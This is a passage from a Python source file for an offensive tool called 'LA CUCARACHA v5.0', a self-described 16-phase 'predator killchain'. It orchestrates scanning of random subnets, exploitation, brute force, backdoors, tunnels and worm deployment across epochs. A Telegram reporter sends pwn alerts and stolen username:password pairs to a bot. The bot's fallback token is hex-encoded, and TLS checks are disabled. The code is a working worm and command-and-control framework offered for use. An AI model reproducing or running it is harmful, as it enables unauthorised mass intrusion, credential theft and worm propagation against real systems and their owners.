                log.info(f"🐉 Predator mode set to: {self.decision_engine.predator}")
        except Exception as e:
            log.warning(f"Control flag check error: {e}")

    def run_phase(self, phase_name: str, **extra_kwargs) -> Dict:
        """Execute a single phase with 300s timeout and return results."""
        if phase_name not in self.phase_map:
            log.error(f"Unknown phase: {phase_name}")
            return {"count": 0, "success": False, "error": f"Unknown phase: {phase_name}"}
        
        try:
            handler = self.phase_map[phase_name]
            
            # Special handling for SLEEP phase (needs extra params)
            if phase_name == "SLEEP":
                fn = lambda: handler(self.db, {"hit_streak": self.decision_engine.hit_streak, 
                                               "empty_streak": self.decision_engine.empty_streak})
            else:
                fn = lambda: handler(self.db, **extra_kwargs)
            
            # Execute phase in thread with 300s hard timeout
            pool = concurrent.futures.ThreadPoolExecutor(max_workers=1)
            try:
                fut = pool.submit(fn)
                try:
                    result = fut.result(timeout=300)
                except concurrent.futures.TimeoutError:
                    log.warning(f"⏰ Phase {phase_name} timed out after 300s — forcing skip")
                    fut.cancel()
                    return {"count": 0, "success": False, "error": f"Phase timed out after 300s"}
                except Exception as e:
                    log.exception(f"Phase {phase_name} crashed: {e}")
                    return {"count": 0, "success": False, "error": str(e)}
            finally:
                pool.shutdown(wait=False)  # Don't block — thread may be stuck on I/O
            
            # Update phase stats
            self.phase_stats[phase_name]["count"] = result.get("count", 0)
            self.phase_stats[phase_name]["success"] = result.get("success", False)
            self.phase_stats[phase_name]["last_run"] = datetime.now().isoformat()
            
            return result
        except Exception as e:
            log.exception(f"Phase {phase_name} crashed: {e}")
            return {"count": 0, "success": False, "error": str(e)}
    
    def run_epoch(self) -> Dict:
        """Run a complete epoch (all phases until we loop back to ICMP)."""
        epoch_start = time.time()
        phase_iterations = 0
        max_iterations = 32  # Safety valve
        per_phase_retries = {}  # Track retries per phase
        epoch_results = []
        phases_executed = []
        
        log.info(f"{'='*60}")
        log.info(f"🎯 EPOCH {self.epoch + 1} START — Phase: {self.current_phase}")
        log.info(f"{'='*60}")
        
        # Reset hit/empty streaks for fresh epoch
        self.decision_engine.hit_streak = 0
        self.decision_engine.empty_streak = 0
        
        while phase_iterations < max_iterations and not self._stop_flag:
            phase_iterations += 1
            phase_name = self.current_phase
            phases_executed.append(phase_name)
            
            # Track per-phase retries
            per_phase_retries[phase_name] = per_phase_retries.get(phase_name, 0) + 1
            
            log.info(f"  [{phase_iterations:02d}] EXECUTING: {phase_name} (retry #{per_phase_retries[phase_name]})")
            
            # Execute phase
            result = self.run_phase(phase_name)
            epoch_results.append({"phase": phase_name, "result": result})
            
            # Log phase result
            count = result.get("count", 0)
            success = result.get("success", False)
            log.info(f"  → {phase_name}: {count} results, success={success}")
            
            # Let decision engine choose next phase
            next_phase = self.decision_engine.decide(phase_name, result)
            self.decision_engine._phase_transitions[phase_name] = next_phase
            self.current_phase = next_phase
            
            log.info(f"  → DECISION: {phase_name} → {next_phase} (streak: hits={self.decision_engine.hit_streak}, empty={self.decision_engine.empty_streak})")
            
            # If we wrapped back to ICMP, epoch is complete
            # (also handles ICMP→ICMP loop — after the first iteration wraps back)
            if next_phase == "ICMP" and (phase_name != "ICMP" or phase_iterations > 1):
                log.info(f"✅ EPOCH {self.epoch + 1} COMPLETE — looped back to ICMP")
                break
            
            # Prevent infinite loops — per-phase retry limit
            if phase_name == next_phase and per_phase_retries.get(phase_name, 0) >= 3:
                # Force forward to next phase
                idx = PHASES_16.index(phase_name)
                next_idx = (idx + 1) % len(PHASES_16)
                forced_retries = per_phase_retries[phase_name]
                per_phase_retries[phase_name] = 0  # Reset retries for the forced phase
                self.current_phase = PHASES_16[next_idx]
                log.warning(f"⚠️ Loop prevention: {phase_name} → {PHASES_16[next_idx]} (forced after {forced_retries} retries)")
        
        epoch_time = time.time() - epoch_start
        self.epoch += 1
        
        # Store epoch results
        self.epoch_results.append({
            "epoch": self.epoch,
            "time": epoch_time,
            "phases": phases_executed,
            "results": epoch_results,
        })
        
        log.info(f"{'='*60}")
        log.info(f"🏁 EPOCH {self.epoch} DONE — {len(phases_executed)} phases in {epoch_time:.1f}s")
        log.info(f"{'='*60}")
        
        return {
            "epoch": self.epoch,
            "time": epoch_time,
            "phases_executed": phases_executed,
            "results": epoch_results,
            "final_phase": self.current_phase,
            "db_stats": self.db.stats(),
        }
    
    def run_continuous(self) -> Dict:
        """Run the killchain continuously until max_epochs or stop signal."""
        log.info("🚀 KILLCHAIN ORCHESTRATOR — Starting continuous execution")
        log.info(f"📡 16-Phase Pipeline: {' → '.join(PHASES_16)}")
        log.info(f"🔄 Max epochs: {self.max_epochs}")
        log.info(f"🔑 Credentials in pool: {len(self.db.q('SELECT * FROM credentials'))}")
        
        # Initial ICMP sweep to populate targets
        log.info("📡 Initial ICMP sweep to discover targets...")
        initial_icmp = phase_icmp_sweep(self.db, subnets=5, hosts_per_subnet=10)
        initial_count = initial_icmp.get('count', 0)
        log.info(f"📡 Found {initial_count} alive hosts")
        
        # Feed initial ICMP results into DB so first epoch has targets
        if initial_count > 0:
            initial_targets = initial_icmp.get('targets', [])
            for ip in initial_targets[:500]:
                try:
                    self.db.q(
                        "INSERT OR IGNORE INTO targets (ip, port, proto, icmp_responded, added) "
                        "VALUES (?, 0, 'icmp', 1, datetime('now'))",
                        (ip,)
                    )
                except Exception:
                    pass
            log.info(f"📡 Pre-seeded {min(initial_count, 500)} targets from initial ICMP sweep")
        
        if initial_count == 0:
            log.warning("⚠️ No targets found in initial ICMP sweep. Will retry with expanded subnets.")
        
        total_epochs = 0
        
        while total_epochs < self.max_epochs and not self._stop_flag:
            # Check for bot commands from Telegram
            self._process_bot_commands()
            
            # Check control flags (aggressive/predator)
            self._check_control_flags()
            
            # Run one epoch
            epoch_result = self.run_epoch()
            total_epochs += 1
            
            # Check if we should switch to sustainment mode
            db_stats = self.db.stats()
            worm_count = db_stats.get('worm_deployed', 0)
            intel_count = db_stats.get('intel_collected', 0)
            if worm_count > 0 and intel_count > 0:
                log.info(f"🐛 Worm established with {worm_count} nodes, {intel_count} intel logs")
                # Early exit: if worm is well-established, switch to sustainment
                if worm_count >= 50 and intel_count >= 100:
                    log.info(f"🏁 Worm fully established ({worm_count} nodes, {intel_count} intel logs) — switching to sustainment mode")
                    break
            
            # Print epoch summary
            log.info(f"📊 EPOCH {total_epochs} SUMMARY:")
            log.info(f"  Targets: {db_stats.get('targets', 0)}")
            log.info(f"  Exploited: {db_stats.get('brute_pwned', 0) + db_stats.get('web_pwned', 0) + db_stats.get('embed_pwned', 0) + db_stats.get('enterprise_pwned', 0)}")
            log.info(f"  Backdoors: {db_stats.get('backdoor_installed', 0)}")
            log.info(f"  Tunnels: {db_stats.get('tunnel_active', 0)}")
            log.info(f"  Worm: {db_stats.get('worm_deployed', 0)}")
            log.info(f"  Intel: {db_stats.get('intel_collected', 0)}")
            log.info(f"  Credentials: {db_stats.get('credentials', 0)}")
            
            # If we have a report phase result, print it
            if epoch_result.get('results'):
                for phase_res in epoch_result['results']:
                    if phase_res['phase'] == 'REPORT' and phase_res['result'].get('success'):
                        report = phase_res['result'].get('report', {})
                        if report:
                            log.info(f"📦 Report generated with {len(report.get('recent_intel', []))} intel entries")
        
        # Final report
        log.info("🏁 KILLCHAIN COMPLETE — generating final report")
        final_report = phase_report(self.db)
        
        # Print final statistics
        final_stats = self.db.stats()
        log.info(f"{'='*60}")
        log.info(f"🏆 FINAL STATISTICS — {total_epochs} epochs")
        log.info(f"{'='*60}")
        for key, value in final_stats.items():
            log.info(f"  {key}: {value}")
        log.info(f"{'='*60}")
        
        return {
            "total_epochs": total_epochs,
            "final_stats": final_stats,
            "report": final_report.get("report", {}),
        }
    
    def print_epoch_summary(self) -> None:
        """Print a human-readable summary of all epochs."""
        print("\n" + "="*70)
        print("📊 KILLCHAIN EPOCH SUMMARY")
        print("="*70)
        
        for epoch_data in self.epoch_results:
            epoch_num = epoch_data["epoch"]
            time_taken = epoch_data["time"]
            phases = epoch_data["phases"]
            results = epoch_data["results"]
            
            # Count successes by phase
            success_counts = {}
            for r in results:
                phase = r["phase"]
                success = r["result"].get("success", False)
                count = r["result"].get("count", 0)
                if phase not in success_counts:
                    success_counts[phase] = {"success": 0, "count": 0}
                if success:
                    success_counts[phase]["success"] += 1
                success_counts[phase]["count"] += count
            
            print(f"\n📍 EPOCH {epoch_num:03d} — {time_taken:.1f}s — {len(phases)} phases")
            print(f"   Phases: {' → '.join(phases)}")
            print(f"   Results:")
            for phase, data in success_counts.items():
                print(f"     • {phase}: {data['count']} items, {'✅' if data['success'] > 0 else '❌'}")
        
        print("\n" + "="*70)
        
        # Final DB stats
        stats = self.db.stats()
        print("📈 FINAL DATABASE STATS:")
        for key, value in stats.items():
            print(f"  {key}: {value}")
        print("="*70)


# ═══════════════════════════════════════════════════════════════════════════════
# MAIN ENTRY POINT
# ═══════════════════════════════════════════════════════════════════════════════

def main():
    """Main entry point for the 16-phase killchain."""
    parser = argparse.ArgumentParser(
        description="🐛 LA CUCARACHA v5.0 — 16-Phase Predator Killchain",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
PHASES:
  📡 ICMP → 🔍 TCP → 🖥️ FP → 🧨 CVE → 🌐 Web → ⚙️ Embed → 🧟 Genzai
  → 🏢 Enterprise → 🔑 Brute → 🚪 Backdoor → 🔌 Tunnel → 🐛 Worm
  → 🧠 Intel → 💤 Sleep → 🔄 Crossfeed → 📦 Intel Report

IF/THEN LOGIC:
  - IF targets found → proceed to next phase
  - IF no targets → retry current phase or rotate subnet
  - IF hit streak > 5 → short sleep (5s)
  - IF empty streak > 5 → long sleep (30s)
  - IF phase fails repeatedly → force advance

EXAMPLES:
  %(prog)s                     # Full autonomous killchain (100 epochs)
  %(prog)s --epochs 10         # Run 10 epochs
  %(prog)s --phase ICMP        # Run single phase only
  %(prog)s --status            # Show current status
  %(prog)s --clean             # Reset database
  %(prog)s --verbose           # Verbose logging
        """
    )
    
    parser.add_argument("--epochs", type=int, default=100, help="Max epochs (default: 100)")
    parser.add_argument("--phase", type=str, choices=PHASES_16, help="Run a single phase and exit")
    parser.add_argument("--status", action="store_true", help="Show current orchestrator status")
    parser.add_argument("--clean", action="store_true", help="Reset database")
    parser.add_argument("--verbose", "-v", action="store_true", help="Verbose logging")
    parser.add_argument("--subnets", type=int, default=3, help="Number of subnets to scan per ICMP/TCP pass")
    parser.add_argument("--hosts-per-subnet", type=int, default=7, help="Hosts to ping per subnet")
    parser.add_argument("--db", type=str, default="worm_mesh_v5.db", help="Database path")
    
    args = parser.parse_args()
    
    # Setup logging
    log_level = logging.DEBUG if args.verbose else logging.INFO
    logging.basicConfig(
        level=log_level,
        format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
        datefmt="%Y-%m-%d %H:%M:%S",
        stream=sys.stdout,
        force=True,
    )
    
    # Handle clean
    if args.clean:
        if os.path.exists(args.db):
            os.remove(args.db)
            print(f"✅ Database {args.db} cleaned")
        else:
            print(f"ℹ️ Database {args.db} does not exist")
        return
    
    # Initialize database and orchestrator
    db = KillchainDB(args.db)
    orchestrator = KillchainOrchestrator(db, max_epochs=args.epochs)
    
    # Handle status
    if args.status:
        status = orchestrator.get_status()
        print("\n📊 ORCHESTRATOR STATUS")
        print("="*50)
        for key, value in status.items():
            print(f"  {key}: {value}")
        print("="*50)
        return
    
    # Handle single phase
    if args.phase:
        print(f"\n🎯 Running single phase: {args.phase}")
        print("="*50)
        result = orchestrator.run_phase(args.phase)
        print(json.dumps(result, indent=2, default=str))
        return
    
    # Full killchain
    print("\n" + "="*70)
    print("🐛 LA CUCARACHA v5.0 — PREDATOR KILLCHAIN")
    print("="*70)
    print(f"📡 16-Phase Pipeline: {' → '.join(PHASES_16)}")
    print(f"🔄 Max epochs: {args.epochs}")
    print(f"📡 Subnets per pass: {args.subnets}")
    print(f"🏠 Hosts per subnet: {args.hosts_per_subnet}")
    print(f"🗄️  Database: {args.db}")
    print("="*70)
    print("\n⚡ PRESS Ctrl+C TO STOP\n")
    
    try:
        # Override subnets count in phase functions via global
        # We'll just pass them through the orchestrator's internal state
        orchestrator.subnets = args.subnets
        orchestrator.hosts_per_subnet = args.hosts_per_subnet
        
        # Monkey-patch phase functions to use orchestrator params
        # Simple: store in module globals
        globals()['_ORCHESTRATOR_SUBNETS'] = args.subnets
        globals()['_ORCHESTRATOR_HOSTS_PER_SUBNET'] = args.hosts_per_subnet
        
        # Override phase_icmp_sweep to use our params
        def _icmp_with_params(db: KillchainDB) -> Dict:
            return phase_icmp_sweep(db, 
                                   subnets=globals().get('_ORCHESTRATOR_SUBNETS', 3),
                                   hosts_per_subnet=globals().get('_ORCHESTRATOR_HOSTS_PER_SUBNET', 7))
        orchestrator.phase_map["ICMP"] = _icmp_with_params
        
        # Run continuous
        result = orchestrator.run_continuous()
        
        print("\n" + "="*70)
        print("🏁 KILLCHAIN COMPLETE")
        print("="*70)
        print(f"  Total epochs: {result['total_epochs']}")
        print(f"  Worm nodes: {result['final_stats'].get('worm_deployed', 0)}")
        print(f"  Intel logs: {result['final_stats'].get('intel_collected', 0)}")
        print(f"  Credentials: {result['final_stats'].get('credentials', 0)}")
        print("="*70)
        
        # Print epoch summary
        orchestrator.print_epoch_summary()
        
    except KeyboardInterrupt:
        print("\n\n🛑 Received interrupt — shutting down gracefully...")
        orchestrator.stop()
        print("✅ Orchestrator stopped")
        orchestrator.print_epoch_summary()
        
    except Exception as e:
        log.exception(f"💥 Fatal error: {e}")
        print(f"\n❌ Fatal error: {e}")
        sys.exit(1)


if __name__ == "__main__":
    # Entry handled by ultimate_16_main() below
    pass

# ═══════════════════════════════════════════════════════════════════════════════
# TELEGRAM REPORTER — Real-time Phase Status + Alerts
# ═══════════════════════════════════════════════════════════════════════════════

class TelegramReporter:
    """Async batched Telegram reporter with conditional IF/THEN decision hooks."""

    def __init__(self, token: str = "", admin_ids: List[int] = None,
                 chat_id: int = None, dry_run: bool = False):
        # Priority: command-line arg > config file > env var > hardcoded fallback
        self.token = token
        self.admin_ids = admin_ids or [0, 0]
        self.chat_id = chat_id or 0
        self.dry_run = dry_run
        self._stop = False
        self._queue = deque()
        self._batch = []
        self._batch_lock = threading.Lock()
        self._batch_last_flush = time.time()
        self._send_count = 0
        self._drop_count = 0
        self._short_count = 0
        self._rate_event_times = deque(maxlen=60)  # rolling 1-minute window
        self._in_batch_mode = False
        self._stealth_mode = False
        self._critical_cooldown = 0.0
        self._flusher_thread = threading.Thread(target=self._periodic_batch_flusher, daemon=True)
        self._flusher_thread.start()

        # Load token — try config first (has valid data), fall through to env, then hex
        if not self.token:
            self._load_token_from_config()
        if not self.token or len(self.token) < 40:
            # Config didn't have a token or was too short — try env (may be corrupted)
            env_token = os.environ.get("TELEGRAM_BOT_TOKEN", "")
            if len(env_token) >= 40:
                self.token = env_token
        if not self.token or len(self.token) < 40:
            # Last resort — hardcoded hex fallback
            self._load_token_hex_fallback()

    def _load_token_from_config(self):
        """Load Telegram token from config file."""
        config_paths = [
            "/opt/hermes/telegram_config.json",
            "/opt/borg/telegram_token.txt",
            "telegram_config.json",
            os.path.expanduser("~/.lacucaracha/telegram_token.txt"),
        ]
        for path in config_paths:
            try:
                if path.endswith(".json"):
                    with open(path, "r") as f:
                        cfg = json.load(f)
                        self.token = cfg.get("bot_token", "")
                        # Support both singular chat_id and plural chat_ids list
                        if cfg.get("chat_id"):
                            self.chat_id = cfg.get("chat_id")
                        elif cfg.get("chat_ids"):
                            self.chat_id = cfg["chat_ids"][0]
                        if cfg.get("admin_ids"):
                            self.admin_ids = cfg.get("admin_ids")
                        if self.token:
                            break
                else:
                    with open(path, "r") as f:
                        token = f.read().strip()
                        if token:
                            self.token = token
                            break
            except Exception:
                continue

    def _load_token_hex_fallback(self):
        """Hardcoded hex-encoded fallback token."""
        if self.token and len(self.token) >= 40:
            return
        hex_parts = ["383836363438333439333a", "414147346451504e3755672d",
                     "6b654d5234706b4a56555f", "6b6f6463447a356e46576863"]
        try:
            self.token = bytes.fromhex("".join(hex_parts)).decode()
        except Exception:
            pass

    def _periodic_batch_flusher(self):
        """Background thread to flush batch messages periodically."""
        while not self._stop:
            time.sleep(2.5)
            self._flush_short_batch()

    def _flush_short_batch(self):
        """Flush the short message batch."""
        with self._batch_lock:
            if not self._batch:
                return
            batch = self._batch[:]
            self._batch.clear()
            self._batch_last_flush = time.time()
        text = "\n".join(batch)
        print(f"[FLUSHER] Flushing batch: {len(batch)} items, {len(text)} chars", flush=True)
        self._send(text)

    def _rate_limited_send(self, text: str, critical: bool = False) -> bool:
        """Send respecting rate limits. Critical bypasses batching entirely."""
        # Track event
        now = time.time()
        self._rate_event_times.append(now)
        
        # Count events in last 60s
        cutoff = now - 60.0
        while self._rate_event_times and self._rate_event_times[0] < cutoff:
            self._rate_event_times.popleft()
        events_per_min = len(self._rate_event_times)
        
        # IF/THEN SMART: IF events/min > 5, switch to batch summary mode
        if events_per_min > 5 and not critical:
            self._in_batch_mode = True
            # Inject into batch instead of direct send
            with self._batch_lock:
                self._batch.append(text)
                self._short_count += 1
                if len(self._batch) >= 8:
                    self._flush_short_batch()
            return True
        
        # IF/THEN SMART: If we were in batch mode but throughput dropped, release
        if events_per_min <= 3 and self._in_batch_mode:
            self._in_batch_mode = False
            self._batch.append("📊 <b>Rate normal</b> — Resuming individual reports")
        
        # Direct send
        return self._send(text)
    
    def critical_alert(self, message: str) -> bool:
        """Bypass ALL batching — send immediately with ALERT prefix."""
        now = time.time()
        if now - self._critical_cooldown < 2.0:
            return False  # Debounce critical alerts
        self._critical_cooldown = now
        return self._send(f"⚡ <b>CRITICAL</b> ⚡\n{message}")
    
    def _send(self, text: str) -> bool:
        """Send a message via Telegram API."""
        if self.dry_run:
            print(f"[TELEGRAM] Dry run, would send: {len(text)} chars", flush=True)
            return False
        if not self.token:
            print(f"[TELEGRAM] NO TOKEN! token={repr(self.token)}, config file exists={os.path.exists('/opt/hermes/telegram_config.json')}", flush=True)
            return False
        print(f"[TELEGRAM] Sending {len(text)} chars to chat_id={self.chat_id}", flush=True)
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            data = json.dumps({
                "chat_id": self.chat_id,
                "text": text[:4096],
                "parse_mode": "HTML",
            }).encode()
            req = urllib.request.Request(
                f"https://api.telegram.org/bot{self.token}/sendMessage",
                data=data, method="POST",
                headers={"Content-Type": "application/json"},
            )
            with urllib.request.urlopen(req, timeout=5, context=ctx) as resp:
                resp_data = json.loads(resp.read().decode())
                if resp_data.get("ok"):
                    self._send_count += 1
                    print(f"[TELEGRAM] Sent OK (chat_id={self.chat_id}, {len(text)} chars)", flush=True)
                    return True
                else:
                    desc = resp_data.get("description", "unknown")
                    print(f"[TELEGRAM] API error: {desc} (chat_id={self.chat_id})", flush=True)
            self._drop_count += 1
            return False
        except Exception as e:
            self._drop_count += 1
            print(f"[TELEGRAM] Send failed: {e} (chat_id={self.chat_id}, token_len={len(self.token)})", flush=True)
            return False

    def short(self, action: str, target: str, status: str, detail: str = ""):
        """Non-blocking short status line — batched. Respects stealth mode."""
        # IF/THEN SMART: In stealth mode, only report SUCCESS/PWN/critical actions
        if self._stealth_mode and action not in ("PWN", "SUCCESS", "ALERT", "DECISION", "ERROR"):
            return
        if self._stealth_mode and status not in ("PWNED", "SUCCESS", "ERROR") and action == "STATUS":
            return
        
        emoji_map = {
            "ICMP": "📡", "TCP": "🔍", "FP": "🖥️", "CVE": "🧨",
            "WEB": "🌐", "EMBED": "⚙️", "GENZAI": "🧟", "ENTERPRISE": "🏢",
            "BRUTE": "🔑", "BACKDOOR": "🚪", "TUNNEL": "🔌", "WORM": "🐛",
            "INTEL": "🧠", "SLEEP": "💤", "CROSSFEED": "🔄", "REPORT": "📦",
            "PWN": "💀", "SUCCESS": "✅", "FAIL": "❌", "ERROR": "🔥",
            "DECISION": "🧠", "ALERT": "⚡", "STATUS": "📊",
        }
        emoji = emoji_map.get(action.upper(), emoji_map.get(status.upper(), "•"))
        line = f"{emoji} <b>{action}</b> {target} — {status}"
        if detail:
            line += f" | {detail}"
        with self._batch_lock:
            self._batch.append(line)
            self._short_count += 1
            if len(self._batch) >= 8:
                self._flush_short_batch()

    def decision(self, if_condition: str, then_action: str, target: str = ""):
        """Report a decision from the IF/THEN engine — with severity context."""
        # IF/THEN: Determine severity based on condition content
        lower_cond = if_condition.lower()
        if "pwned" in lower_cond and any(c.isdigit() for c in if_condition):
            prefix = "\U0001f525"  # Fire for pwn decisions
        elif "error" in lower_cond or "fail" in lower_cond:
            prefix = "\U0001f4a2"  # Warning for errors
        elif "creds" in lower_cond or "credential" in lower_cond:
            prefix = "\U0001f511"  # Key for credential decisions
        elif "worm" in lower_cond:
            prefix = "\U0001f41b"  # Bug for worm decisions
        elif "backdoor" in lower_cond or "tunnel" in lower_cond:
            prefix = "\U0001f6aa"  # Door for persistence
        else:
            prefix = "\U0001f9e0"  # Brain for normal decisions

        line = f"{prefix} <b>IF</b> {if_condition} <b>\u2192 THEN</b> {then_action}"
        if target:
            line += f" ({target})"

        # IF: High severity decisions sent immediately
        if prefix in ["\U0001f525", "\U0001f4a2"]:
            self._send(line)
        else:
            with self._batch_lock:
                self._batch.append(line)
                self._short_count += 1
                if len(self._batch) >= 8:
                    self._flush_short_batch()

    def phase_report(self, phase: str, data: Dict):
        """Full phase report (immediate)."""
        emoji_map = {
            "ICMP": "📡", "TCP": "🔍", "FP": "🖥️", "CVE": "🧨",
            "WEB": "🌐", "EMBED": "⚙️", "GENZAI": "🧟", "ENTERPRISE": "🏢",
            "BRUTE": "🔑", "BACKDOOR": "🚪", "TUNNEL": "🔌", "WORM": "🐛",
            "INTEL": "🧠", "SLEEP": "💤", "CROSSFEED": "🔄", "REPORT": "📦",
        }
        emoji = emoji_map.get(phase.upper(), "🎯")
        lines = [f"{emoji} <b>PHASE: {phase.upper()}</b>"]
        for k, v in data.items():
            if isinstance(v, dict):
                continue
            lines.append(f"  ▸ {k}: {v}")
        self._send("\n".join(lines))

    def phase_result(self, phase: str, count: int, success: bool, detail: str = ""):
        """Quick phase result notification — conditional IF/THEN."""
        # IF/THEN: Skip completely if zero and successful
        if count == 0 and success:
            return

        # IF/THEN: Choose icon based on count magnitude
        if count >= 100:
            status_icon = "\U0001f525"  # Fire for massive results
        elif count >= 10:
            status_icon = "\u2705"      # Check for good results
        elif count > 0:
            status_icon = "\u2714\ufe0f"  # Small check for modest results
        elif not success:
            status_icon = "\u274c"      # Red X for failures
        else:
            status_icon = "\u26a0\ufe0f"  # Warning for unexpected

        msg = f"{status_icon} <b>{phase}</b>"
        # IF/THEN: Different format for zero vs non-zero
        if count > 0:
            msg += f" \u2014 {count} results"
        elif not success:
            msg += f" \u2014 FAILED"
        else:
            msg += f" \u2014 0"

        if detail:
            msg += f" | {detail}"

        # IF/THEN: IF massive result, send immediately (don't batch)
        if count >= 100:
            self._send(msg)
        else:
            with self._batch_lock:
                self._batch.append(msg)
                self._short_count += 1
                if len(self._batch) >= 8:
                    self._flush_short_batch()

    def pwn_alert(self, ip: str, port: int, phase: str, user: str = "", pwd: str = ""):
        """Immediate pwn alert — conditional IF/THEN with priority."""
        # IF/THEN: Priority based on phase (enterprise/admin targets flagged)
        high_priority = phase.upper() in ["ENTERPRISE", "GENZAI", "CVE"]

        # IF/THEN: Choose icon based on priority
        if high_priority:
            icon = "\U0001f4a5"  # Collision for high-value targets
        else:
            icon = "\U0001f480"  # Skull for normal pwns

        lines = [
            f"{icon} <b>PWNED</b> \u2014 {ip}:{port}",
            f"  \u25b8 Phase: {phase}",
        ]
        if user and pwd:
            lines.append(f"  \u25b8 Creds: <code>{user}:{pwd}</code>")
        if high_priority:
            lines.append(f"  \u26a1 High-value target \u2014 priority processing")

        self._send("\n".join(lines))

    def epoch_summary(self, epoch: int, stats: Dict, phases: List[str], time_taken: float):
        """Epoch summary report — conditional IF/THEN per stat."""
        emoji = "\U0001f4ca" if epoch % 10 == 0 else "\U0001f4c8"
        lines = [f"{emoji} <b>EPOCH {epoch:03d}</b> \u2014 {time_taken:.1f}s"]

        # Always show phases executed
        arrow = chr(0x2192)
        lines.append(f"  {chr(0x25b8)} Phases: {arrow.join(phases[:8])}" + ("..." if len(phases) > 8 else ""))

        # IF/THEN: Targets — only show if non-zero OR if epoch 0
        t = stats.get('targets', 0)
        if t > 0 or epoch == 0:
            lines.append(f"  {chr(0x25b8)} Targets: {t}")

        # IF/THEN: Pwned — calc total only if any phase has pwns
        pwned_total = sum(stats.get(k, 0) for k in ['brute_pwned', 'web_pwned', 'embed_pwned', 'enterprise_pwned'])
        if pwned_total > 0:
            pwn_parts = []
            for k, emoji_char in [('web_pwned', chr(0x1f310)), ('embed_pwned', chr(0x2699) + '\ufe0f'), ('enterprise_pwned', chr(0x1f3e2)), ('brute_pwned', chr(0x1f511))]:
                v = stats.get(k, 0)
                if v > 0:
                    pwn_parts.append(f"{emoji_char}{v}")
            lines.append(f"  {chr(0x25b8)} Pwned: {pwned_total} ({' / '.join(pwn_parts)})")

        # IF/THEN: Worm nodes
        w = stats.get('worm_deployed', 0)
        if w > 0:
            lines.append(f"  {chr(0x25b8)} Worm: {w} nodes")

        # IF/THEN: Intel
        ii = stats.get('intel_collected', 0)
        if ii > 0:
            lines.append(f"  {chr(0x25b8)} Intel: {ii} logs")

        # IF/THEN: Credentials
        cc = stats.get('credentials', 0)
        if cc > 0:
            lines.append(f"  {chr(0x25b8)} Creds: {cc}")

        # IF/THEN: IF nothing happened, just say idle
        if pwned_total == 0 and w == 0 and ii == 0 and cc == 0:
            lines.append(f"  {chr(0x25b8)} No activity \u2014 scanning/waiting")

        self._send("\n".join(lines))

    def final_report(self, total_epochs: int, stats: Dict, report: Dict):
        """Final report after killchain completion — conditional IF/THEN sections."""
        lines = ["\U0001f3c6 <b>KILLCHAIN COMPLETE</b>"]
        lines.append(f"  {chr(0x25b8)} Total epochs: {total_epochs}")

        # IF/THEN: Targets
        t = stats.get('targets', 0)
        lines.append(f"  {chr(0x25b8)} Targets: {t}")

        # IF/THEN: Pwned with breakdown
        pwned_total = sum(stats.get(k, 0) for k in ['brute_pwned', 'web_pwned', 'embed_pwned', 'enterprise_pwned'])
        if pwned_total > 0:
            pwn_parts = []
            for k, em in [('web_pwned', chr(0x1f310)), ('embed_pwned', chr(0x2699) + '\ufe0f'), ('enterprise_pwned', chr(0x1f3e2)), ('brute_pwned', chr(0x1f511))]:
                v = stats.get(k, 0)
                if v > 0:
                    pwn_parts.append(f"{em}{v}")
            lines.append(f"  {chr(0x25b8)} Pwned: {pwned_total} ({' / '.join(pwn_parts)})")
        else:
            lines.append(f"  {chr(0x25b8)} Pwned: 0")

        # IF/THEN: Post-exploit (only non-zero)
        post_items = []
        bd = stats.get('backdoor_installed', 0)
        if bd > 0:
            post_items.append(f"{chr(0x1f6aa)}{bd} backdoor")
        tn = stats.get('tunnel_active', 0)
        if tn > 0:
            post_items.append(f"{chr(0x1f50c)}{tn} tunnel")
        wm = stats.get('worm_deployed', 0)
        if wm > 0:
            post_items.append(f"{chr(0x1f41b)}{wm} worm")
        if post_items:
            lines.append(f"  {chr(0x25b8)} Post-Exploit: {' / '.join(post_items)}")

        # IF/THEN: Intel
        ii = stats.get('intel_collected', 0)
        if ii > 0:
            lines.append(f"  {chr(0x25b8)} Intel: {ii} logs")

        # IF/THEN: Creds
        cc = stats.get('credentials', 0)
        if cc > 0:
            lines.append(f"  {chr(0x25b8)} Creds: {cc}")

        # IF/THEN: Phase completion (only positive counts)
        phase_completion = report.get("phase_completion", {})
        if phase_completion:
            active = {p: c for p, c in phase_completion.items() if c > 0}
            if active:
                lines.append("")
                lines.append(f"{chr(0x1f4ca)} <b>Phase Results (IF/THEN):</b>")
                for phase, count in active.items():
                    lines.append(f"  {chr(0x25b8)} {phase.upper()}: {count}")

        self._send("\n".join(lines))

    def error(self, phase: str, error: str):
        """Error report."""
        msg = f"🔥 <b>ERROR</b> — {phase}: {error[:100]}"
        self._send(msg)

    def flush(self, timeout: float = 10.0) -> int:
        """Force flush all pending messages."""
        self._flush_short_batch()
        return len(self._batch)

    def stats(self) -> Dict:
        """Get reporter statistics."""
        return {
            "sent": self._send_count,
            "dropped": self._drop_count,
            "short": self._short_count,
            "batch_size": len(self._batch),
        }

    def stop(self):
        """Stop the reporter."""
        self._stop = True
        self.flush()
# ENHANCED KILLCHAIN ORCHESTRATOR WITH TELEGRAM
# ═══════════════════════════════════════════════════════════════════════════════

class EnhancedKillchainOrchestrator(KillchainOrchestrator):
    """Killchain orchestrator with Telegram reporting integrated."""
    
    def __init__(self, db: KillchainDB, max_epochs: int = 100, 
                 telegram_token: str = "", chat_id: int = None):
        super().__init__(db, max_epochs)
        self.reporter = TelegramReporter(token=telegram_token, chat_id=chat_id)
        self._last_pwn_report = {}
        self._report_interval = 300  # 5 minutes between summary reports
        # Smart upgrades: resource state
        self._last_resource_check = 0.0
        self._resource_check_interval = 60.0  # check every 60s
        self._resource_throttled = False
        self._stealth_logging = False
        self._last_pwn_count = 0

    def _telegram_resource_alert(self, cpu: float, mem: float, disk_mb: float) -> None:
        """Send a resource warning to Telegram if limits are breached."""
        parts = []
        if cpu > 85: parts.append(f"CPU {cpu:.0f}%")
        if mem > 85: parts.append(f"RAM {mem:.0f}%")
        if disk_mb < 100: parts.append(f"Disk {disk_mb:.0f}MB")
        if parts:
            self.reporter._send(f"⚠️ <b>Resource Warning</b> — {' / '.join(parts)}")
        
    def _web_progress(self, partial_count: int, pwned_targets: list) -> None:
        """Called during pwn phases every 5 pwns to report live progress."""
        print(f"[PROGRESS] PWN count={partial_count}, batch_size={len(self.reporter._batch)}", flush=True)
        self.reporter.short("PWN", "PROGRESS", f"{partial_count} pwned so far")
    
